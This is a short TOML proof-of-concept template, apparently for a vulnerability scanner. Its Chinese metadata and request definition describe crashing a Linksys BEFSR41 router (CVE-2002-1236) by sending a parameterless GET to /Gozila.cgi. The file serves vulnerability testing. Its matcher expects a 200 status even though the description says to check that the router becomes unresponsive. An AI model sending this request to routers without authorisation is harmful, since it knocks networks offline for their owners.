[info]
author = "AVE"
description = "向 Linksys BEFSR41 路由器的 /Gozila.cgi 发送不带参数的 HTTP GET 请求，触发 CGI 处理异常导致设备崩溃重启。验证方式：发送请求后检测路由器是否无响应（DoS 触发）。"
id = "POC-AVE-2002-0561"
name = "Linksys BEFSR41 Gozila.cgi 拒绝服务漏洞 PoC"
severity = "medium"
tags = [
    "cve-2002-1236",
    "dos",
    "linksys",
    "router",
]
vuln_id = [
    "CVE-2002-1236",
    "AVE-2002-0561",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/Gozila.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
